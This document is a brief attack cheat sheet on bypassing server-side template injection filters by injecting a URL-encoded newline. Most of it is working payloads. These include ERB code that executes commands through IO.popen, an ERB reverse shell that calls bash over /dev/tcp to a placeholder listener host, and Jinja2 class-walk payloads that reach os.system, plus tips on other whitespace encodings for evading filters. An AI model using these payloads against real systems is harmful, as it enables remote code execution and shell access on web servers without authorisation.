# SSTI Newline Injection Bypass

Some SSTI filters check only the first line of input (e.g., regex anchored without `DOTALL`). URL-encode a newline (`%0a`) to inject the template payload on a new line, bypassing the check.

## Technique

If a field blocks template syntax on the same line:

```
category=safe_value%0a<%25%3d+IO.popen('id').readlines()+%25>
```

Decoded:
```
safe_value
<%= IO.popen('id').readlines() %>
```

## Ruby/ERB SSTI

```
# URL-encoded:
category=legit%0a<%25%3d+system('bash+-c+"bash+-i+>%26+/dev/tcp/<LHOST>/<LPORT>+0>%261"')+%25>

# Decoded equivalent:
<%= system('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"') %>
```

## Python/Jinja2 SSTI (with newline bypass)

```
{{''.__class__.__mro__[1].__subclasses__()}}   # enumerate classes
{{''.__class__.__mro__[1].__subclasses__()[<N>].__init__.__globals__['os'].system('id')}}
```

## Notes

- `%0a` = newline; also try `%0d%0a` (CRLF) if `%0a` alone doesn't work
- Check the filter by sending only `%0a` and seeing if the error changes
- Also try `%0d`, `%09` (tab), `%0b` (vertical tab) as alternative whitespace bypasses
- ERB: `<%= ... %>` executes and outputs; `<% ... %>` executes silently
